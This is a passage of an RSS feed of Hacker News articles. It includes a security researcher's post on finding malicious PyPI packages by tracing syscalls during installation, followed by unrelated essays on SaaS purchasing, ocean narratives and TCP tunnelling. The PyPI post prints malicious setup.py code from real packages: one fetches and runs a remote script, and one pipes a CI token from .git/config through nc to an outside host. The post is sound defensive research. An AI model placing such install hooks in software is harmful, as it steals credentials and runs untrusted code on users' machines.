<li><a href="https://knight.sc/reverse%20engineering/2019/02/20/syspolicyd-internals.html">syspolicyd internals</a></li>
<li><a href="https://eclecticlight.co/2019/10/10/how-catalina-handles-app-first-run/">How Catalina handles app first run</a></li>
<li><a href="https://eclecticlight.co/2020/01/27/what-could-possibly-go-wrong-on-an-app-first-run/">What could possibly go wrong on an app first run?</a></li>
<li><a href="https://eclecticlight.co/2018/12/29/amfi-checking-file-integrity-on-your-mac/">AMFI: checking file integrity on your Mac</a></li>
<li><a href="http://www.newosxbook.com/articles/CodeSigning.pdf">Code Signing – Hashed Out, RSA Conference</a></li>
<li><a href="https://secret.club/2020/08/14/macos-entitlements.html">Abusing MacOS Entitlements for code execution</a></li>
</ul>
<h4 id="addendum">Addendum:</h4>
<p>Unfortunately, my article was flagged by some users after getting on the front page of Hacker News! I guess they just didn't appreciate the humour? However, you can check out <a href="https://news.ycombinator.com/item?id=25083934">the discussion</a> before it was taken down.</p>
</div></div>]]>
            </description>
            <link>https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083934</guid>
            <pubDate>Fri, 13 Nov 2020 16:29:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hunting for Malicious Packages on PyPI]]>
            </title>
            <description>
<![CDATA[
Score 173 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25081937">thread link</a>) | @mef
<br/>
November 13, 2020 | https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/ | <a href="https://web.archive.org/web/*/https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<article>

<section>
<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
          <span>"name"</span><span>:</span> <span>"gist.githubusercontent.com"</span><span>,</span>
          <span>"addresses"</span><span>:</span> <span>[</span>
            <span>"199.232.64.133"</span>
          <span>]</span>
    <span>}]</span>
  <span>]</span><span>,</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious.py"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious-was-here"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>
<span>with</span> <span>open</span><span>(</span><span>"/tmp/malicious.py"</span><span>,</span> <span>"wb"</span><span>)</span> <span>as</span> <span>fp</span><span>:</span>
    <span>fp</span><span>.</span><span>write</span><span>(</span><span>handler</span><span>.</span><span>read</span><span>())</span>

<span>import</span> <span>subprocess</span>

<span>subprocess</span><span>.</span><span>call</span><span>([</span><span>"python"</span><span>,</span> <span>"/tmp/malicious.py"</span><span>])</span></code></pre></div>
<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>
<span>]</span></code></pre></div>
<p>Suspicious, but not actively harmful. However, this is a <em>perfect</em> example showing the power of tracing syscalls. Here is the relevant code in …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</a></em></p>]]>
            </description>
            <link>https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081937</guid>
            <pubDate>Fri, 13 Nov 2020 13:33:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS Needs a Single Point of Purchase]]>
            </title>
            <description>
<![CDATA[
Score 168 | Comments 163 (<a href="https://news.ycombinator.com/item?id=25081711">thread link</a>) | @alangibson
<br/>
November 13, 2020 | https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html | <a href="https://web.archive.org/web/*/https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href="/2020/11/13/saas-needs-a-single-point-of-purchase.html">
	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

<p><a href="https://news.ycombinator.com/item?id=25081711">Hacker News Discussion Thread</a></p>


</div></div>]]>
            </description>
            <link>https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081711</guid>
            <pubDate>Fri, 13 Nov 2020 13:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “Dying Seas” of the Anthropocene]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25080998">thread link</a>) | @dnetesn
<br/>
November 13, 2020 | http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene | <a href="https://web.archive.org/web/*/http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>D</span>eclarations that the ocean is dying have become commonplace. We read headlines almost daily telling us that the oceans are choked with plastic, overfished, and rapidly acidifying. Yet even in â€œdying,â€� we are told, the ocean threatens human existence as sea levels rise, sea surface temperatures increase, and commercial fish stocks disappear.&nbsp;</p><p>The ocean has thus become emblematic both of a natural world victimized by humanity and of natureâ€™s possible vengeance. In a 2014 video by the nonprofit organization Conservation International, the growling baritone of the actor Harrison Ford speaks for the ocean: â€œI give. They take. But I can always take back.â€�&nbsp; The message is powerful because it conjures images of both the primordial sea as crucible of life and the biblical flood—destruction of life as punishment for human sin. Yet a vengeful ocean is but one of several historical depictions of the sea, some of which have gained prominence at particular moments while others have faded away. In the 1960s and 1970s many scientists, engineers, and policy makers approached the ocean as a vast but resistant reservoir of untapped natural resources. The hostility of the ocean was understood in the context of national calls for increasing exploitation. US Rear Admiral William C. Hushing, for example, in 1967 described the ocean as â€œhostile in almost every way you can think.â€� In Hushingâ€™s view, the task set for â€œManâ€� was â€œto train himself for the hostilityâ€� and eventually â€œfind ways to convert the hostility to friendliness.â€�&nbsp;</p>
<p>Today, the ocean is increasingly cast as fragile, even as dying. And while the ocean voiced by Harrison Ford remains threatening, the message is that humans are responsible for that threat. We, not the ocean, have taken too much. Once we recognize the increasing dominance of a conception of the ocean as fragile and dying, we are prompted to ask how this shapes conservation efforts and whether it has a net positive or negative influence on marine environmental protection. In the fall of 2016, for example, <em>Outside Magazine </em>published an obituary for the Great Barrier Reef. The article quickly went viral, but coral reef scientists condemned the story as irresponsible. The Great Barrier Reef, they pointed out, although under severe threat, was not yet dead. To declare it lifeless was to give up hope. Environmental pessimism comes at a cost. When pseudoscientific claims gain traction, it is often because they appeal to emotions and long-standing narratives already associated with particular environmental spaces.</p>
<p>Dying-seas narratives and imagery may actually hamper communication between scientists and the public. As an example, Jay Cullen, a researcher at the University of Victoria, leads a project to monitor Fukushima radiation in the eastern Pacific. When Cullenâ€™s lab reported that trace radiation was present off the coast of British Columbia but did not represent a significant health hazard, the response was vociferously angry, including death threats aimed at Cullen. In the case of the Fukushima radiation reports, one publicâ€™s response was to reject scientific claims that did not support the narrative of threatening â€œdying seas.â€� To quote the <em>Globe and Mail: </em>â€œDr. Cullen said he frequently hears from people that his science simply canâ€™t be right because the Pacific Ocean is dying. It is adrift with tsunami debris and plastic waste and its stocks have been overfished, but it has not been killed by nuclear radiation.â€�</p>
<blockquote>Hope, like fear, has power to shape the world we will inhabit.</blockquote>
<p>Although hampering science communication, the dying-seas narrative may also contribute to misguided efforts at environmental restoration. In 2012 a native community on Haida Gwaii paid $2.5 million to an American entrepreneur to carry out an iron-seeding experiment off the coast of British Columbia. The goal was to dump iron dust into the sea to artificially trigger a plankton bloom and restore the local salmon population while also sequestering carbon dioxide. As mentioned earlier, oceanographers pioneered iron-seeding experiments but came to deem the method as too risky for practical use. The Haida Gwaii iron-seeding project was therefore condemned by the international scientific community as having violated two international agreements to place checks on unregulated geoengineering. Yet a lay public that was sold on <em>saving </em>a â€œdying seaâ€� triggered what many in the scientific community saw to be dangerous â€œrogue science.â€� Nor is the 2012 iron-seeding event the only scientifically questionable technological solution marketed as a solution for marine ecological crises. A far more ambitious engineering project to skim microplastics from the North Pacific sea surface is now being tested. The Ocean Cleanup project was founded by a teenage Dutch inventor who, after delivering a viral TEDx speech and raising $2.2 million in crowdsourced funding, dropped out of university to develop his project. Despite concerns voiced by oceanographers that the device will not only be ineffective but will harm pelagic marine creatures, the installation was deployed in late 2018.
On a much smaller scale, millions of dollars have been invested in engineering projects around the world in the Sisyphean task of trying to hold back rising seas as the Greenland and Antarctic ice sheets melt. It may be that future oceanographers, unlike their predecessors, will be less focused on encouragement of widespread collaborative observation and experimentation at sea and more concerned with oversight and restriction of interfering scientific and engineering practices.&nbsp;</p>
<p>Unsurprisingly, the projection of sentience onto the natural world fails to move climate change skeptics. Appeals to safeguard individual charismatic species, like the polar bear, risk critique as devaluing human existence in favor of other forms of life. Descriptions of the earth as a victim of human agency are dismissed by political opponents as scientific hubris. Even publics potentially receptive to conservation science risk being demoralized by imaginative invocation of a vast, â€œdyingâ€� non-human entity. The author of a 2014 editorial in <em>Smithsonian Magazine </em>notes, â€œWeâ€™ve gone from thinking the ocean was too big to hurt, to thinking that the ocean is too big and too sick to help.â€� This cognitive-emotional orientation has been unintentionally fostered by scientists intent on educating a lay public on the importance of global systems thinking. Yet the popularization of this approach to nature has its pitfalls. Conceptualizing the oceans as a cohesive nonhuman entity oversimplifies accounts of environmental degradation and limits understanding of local variability.&nbsp;</p>
<p>In 2013, Microsoft cofounder Paul Allen announced a contest called Ocean Challenge. The contest awarded â€œ$10,000 to the most promising new science-based concept for mitigating environmental and/or societal impacts of ocean acidification.â€� The winners of the contest were Ruth D. Gates of the University of Hawaii and Madeleine van Oppen of the Australian Institute of Marine Science. Their project to genetically select and cultivate corals that possess natural resistance to ocean acidification received funding. Coral reefs take up less than 1 percent of the earthâ€™s surface, yet they are habitats for an estimated one-third of all known marine creatures, including 25 percent of commercial seafood species. They also act as natural breakwaters, dampening the power of storm surges and coastal erosion. An estimated 61 percent of coral reefs are under stress and at risk of disappearing by 2030. Thus, the health of coral reefs is widely used as a metric for global ocean health, the marine equivalent of the canary in the coal mine. Gates, who passed away in October 2018, described herself as â€œa futurist.â€� â€œA lot of people want to go back to something. They think, If we just stop doing things, maybe the reef will come back to what it was,â€� she explained. In contrast, her project acknowledged a future â€œwhere nature is no longer fully natural.â€� In Gatesâ€™s understanding, the ocean isnâ€™t dead, but its survival hinges on assumption of responsibility for its now-hybrid character. Is there a cost to abandoning the nineteenth-century ideal of wilderness? Perhaps doing so is the price we must pay to retain a semblance of what once was.&nbsp;</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_6dede823a3aee1159948a355f8d25912.jpg" alt="Screen Shot 2020-11-11 at 9.06.26 PM"><figcaption><span>Detail from a mural by Louis Masai in Shoreditch, London. </span><br><span><a href="https://www.flickr.com/photos/maureen_barlin/21563934214/in/photolist-yRwNnd-nBHi7g-J1mTKy-uR5dZN-yKkUdq-ZpCe1C-tWo3oY-zcVVAU-z1WCtb-vx1TMN-A7rnFd-f8wmYU-tWnYzA-uToKiz-dQNque-HWgEzz">Maureen Barlin</a>. </span></figcaption></figure>
<p>Some theorists and scientists advocate greater inclusion of nonhuman actors in debates about ecological crisis. Bruno Latour, for example, argues that â€œa science of objects and politics of subjectsâ€� must be replaced by a â€œpolitical ecology of collectives consisting of humans and nonhumans.â€� A precedent has been set by the recent allocation of legal rights to rivers in Australia, New Zealand, and India. But although we must not shirk from placing value on nonhuman entities, in the end climate change—and by extension marine environmental degradation—remains a human problem, and we need to foreground human abilities to comprehend and solve it. As Jean-Michel Cousteau, son of Jacques, asserts, â€œThe face of our planet is the ocean. It is the largest ecosystem on our Earth. But the face of climate change is not the whale, the polar bear, the glacier, the rainforest or the desert. The face of climate change is us.â€�&nbsp;<br></p>
<p>The marine sciences, like all branches of scientific knowledge, are shaped by underlying assumptions about human relationship with the natural world. The tensions I have highlighted point to a crisis in scientific and lay imaginations of an ocean radically changed in the course of the Anthropocene. Scientists increasingly talk about the ocean as a hybrid environment. Gates was surely correct in asserting that scientific solutions for an ocean understood as dying can be reached only by acknowledging that the contemporary ocean cannot be conceived apart …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</a></em></p>]]>
            </description>
            <link>http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080998</guid>
            <pubDate>Fri, 13 Nov 2020 10:44:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why TCP over TCP is a bad idea (2001)]]>
            </title>
            <description>
<![CDATA[
Score 110 | Comments 66 (<a href="https://news.ycombinator.com/item?id=25080693">thread link</a>) | @fanf2
<br/>
November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </p><hr>
    <address><a href="mailto:olaf@bigred.inka.de">Olaf Titz</a></address>
